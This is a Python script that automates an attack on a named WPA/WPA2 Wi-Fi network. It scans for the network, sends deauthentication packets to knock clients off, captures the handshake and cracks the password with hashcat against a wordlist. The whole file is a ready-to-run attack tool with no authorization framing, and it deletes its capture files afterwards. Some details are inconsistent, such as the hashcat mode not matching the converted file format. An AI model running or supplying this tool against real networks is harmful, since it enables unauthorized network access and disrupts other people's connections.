
import subprocess
import sys
import time
import os
import re

class InteractiveAutonomousGPUWifiBruteForcer:
    def __init__(self, interface, essid, wordlist_file, time_limit):
        self.interface = interface
        self.essid = essid
        self.wordlist_file = wordlist_file
        self.time_limit = time_limit
        self.handshake_file = f"handshake_{essid}.cap" if essid else "handshake.cap"
        self.hashcat_handshake_file = self.handshake_file + ".hc22000"
        self.cracked_file = "cracked.txt"
        self.target_bssid = None
        self.target_channel = None

    def _scan_for_target(self):
        print(f"[*] Scanning for target network '{self.essid}' on interface '{self.interface}'...")
        try:
            command = ["airodump-ng", self.interface]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(10)
            process.terminate()
            output, _ = process.communicate()
            output = output.decode('utf-8', errors='ignore')

            bssid_pattern = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})\s+" + re.escape(self.essid))
            channel_pattern = re.compile(r"^\s*\d+\s+([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})\s+\d+\s+\d+\s+\d+\s+\d+\s+([0-9]+)\s+" + re.escape(self.essid))

            bssid_match = bssid_pattern.search(output)
            channel_match = channel_pattern.search(output)

            if bssid_match and channel_match:
                self.target_bssid = bssid_match.group(0).split()[0]
                self.target_channel = channel_match.group(3)
                print(f"[*] Target network found:")
                print(f"    ESSID: {self.essid}")
                print(f"    BSSID: {self.target_bssid}")
                print(f"    Channel: {self.target_channel}")
                return True
            else:
                print(f"[-] Target network '{self.essid}' not found during scan.")
                return False

        except FileNotFoundError:
            print("Error: airodump-ng not found. Ensure the aircrack-ng suite is installed.")
            sys.exit(1)
        except Exception as e:
            print(f"An error occurred during scanning: {e}")
            sys.exit(1)

    def _capture_handshake(self):
        if not self.target_bssid or not self.target_channel:
            print("[-] Target BSSID or channel not identified. Cannot capture handshake.")
            return False

        print(f"[*] Capturing handshake for '{self.essid}' on channel {self.target_channel}...")
        capture_command = [
            "airodump-ng",
            "--bssid", self.target_bssid,
            "--channel", self.target_channel,
            "--write", self.handshake_file.replace(".cap", ""),
            self.interface
        ]
        deauth_command = [
            "aireplay-ng",
            "--deauth", "1",
            "-a", self.target_bssid,
            self.interface
        ]

        try:
            capture_process = subprocess.Popen(capture_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(5)  # Give airodump-ng time to start

            print("[*] Sending deauthentication packet to force handshake...")
            deauth_process = subprocess.Popen(deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(15) # Give time for handshake capture (adjust as needed)

            deauth_process.terminate()
            capture_process.terminate()

            # Check if handshake file was created
            if os.path.exists(self.handshake_file):
                print(f"[+] Handshake captured successfully: {self.handshake_file}")
                return True
            else:
                print("[-] Handshake capture failed. You might need to run this again closer to a connected client.")
                return False

        except FileNotFoundError:
            print("Error: airodump-ng or aireplay-ng not found. Ensure the aircrack-ng suite is installed.")
            sys.exit(1)
        except Exception as e:
            print(f"An error occurred during handshake capture: {e}")
            sys.exit(1)

    def _convert_to_hashcat(self):
        print(f"[*] Converting captured handshake to Hashcat format...")
        try:
            command = ["hcxpcapngtool", "-o", self.hashcat_handshake_file, self.handshake_file]
            subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"[+] Handshake converted to Hashcat format: {self.hashcat_handshake_file}")
            return True
        except FileNotFoundError:
            print("Error: hcxpcapngtool not found. Ensure the hcxtools package is installed.")
            return False
        except subprocess.CalledProcessError as e:
            print(f"Error converting handshake: {e.stderr.decode()}")
            return False

    def brute_force(self):
        if not os.path.exists(self.wordlist_file):
            print(f"Error: Wordlist file '{self.wordlist_file}' not found.")
            sys.exit(1)
        if not os.path.exists(self.hashcat_handshake_file):
            print(f"Error: Hashcat handshake file '{self.hashcat_handshake_file}' not found. Ensure handshake capture and conversion were successful.")
            sys.exit(1)

        hashcat_command = [
            "hashcat",
            "-m", "2500",      # WPA/WPA2
            "-a", "0",         # Straight attack
            "-o", self.cracked_file,
            self.hashcat_handshake_file,
            self.wordlist_file
        ]

        print(f"[*] Starting GPU and CPU accelerated brute-force attack against ESSID '{self.essid}'...")
        print(f"[*] Using wordlist: '{self.wordlist_file}'...")
        start_time = time.time()
        process = subprocess.Popen(hashcat_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        try:
            while True:
                output = process.stdout.readline()
                if output == b'' and process.poll() is not None:
                    break
                if output:
                    line = output.decode().strip()
                    print(f"[*] {line}")
                    if "Cracked" in line:
                        end_time = time.time()
                        duration = end_time - start_time
                        print(f"\n[+] Password found (see {self.cracked_file}). Attack completed in {self._format_time(duration)}.")
                        process.terminate()
                        return
                if self.time_limit and (time.time() - start_time > self.time_limit):
                    print(f"\n[-] Time limit of {self._format_time(self.time_limit)} reached. Terminating attack...")
                    process.terminate()
                    return

            return_code = process.wait()
            end_time = time.time()
            duration = end_time - start_time
            if return_code == 0 and not self._check_cracked():
                print(f"\n[-] Password not found within the {'specified time limit and '}provided wordlist. Attack completed in {self._format_time(duration)}.")

        except KeyboardInterrupt:
            print("\n[-] Keyboard interrupt detected. Terminating attack...")
            process.terminate()
        finally:
            if os.path.exists(self.cracked_file):
                self._display_cracked()
            if os.path.exists(self.handshake_file):
                os.remove(self.handshake_file)
            if os.path.exists(self.hashcat_handshake_file):
                os.remove(self.hashcat_handshake_file)

    def _check_cracked(self):
        try:
            with open(self.cracked_file, "r") as f:
                for line in f:
                    if self.essid in line:
                        return True
            return False
        except FileNotFoundError:
            return False

    def _display_cracked(self):
        try:
            with open(self.cracked_file, "r") as f:
                print("\n[+] Contents of cracked passwords file:")
                for line in f:
                    print(f"[+] {line.strip()}")
        except FileNotFoundError:
            pass

    def _format_time(self, seconds):
        minutes = int(seconds // 60)
        seconds = seconds % 60
        return f"{minutes} minutes {seconds:.2f} seconds"

if __name__ == "__main__":
    interface = input("[+] Enter the wireless interface to use for scanning and capturing: ")
    essid = input("[+] Enter the ESSID of the target network: ")
    wordlist_file = input("[+] Enter the path to the password wordlist file (.txt): ")
    time_limit_str = input("[+] Enter the time limit for the attack in seconds (optional, leave blank for no limit): ")
    time_limit = int(time_limit_str) if time_limit_str else None

    brute_forcer = InteractiveAutonomousGPUWifiBruteForcer(interface, essid, wordlist_file, time_limit)

    if brute_forcer._scan_for_target():
        if brute_forcer._capture_handshake():
            if brute_forcer._convert_to_hashcat():
                brute_forcer.brute_force()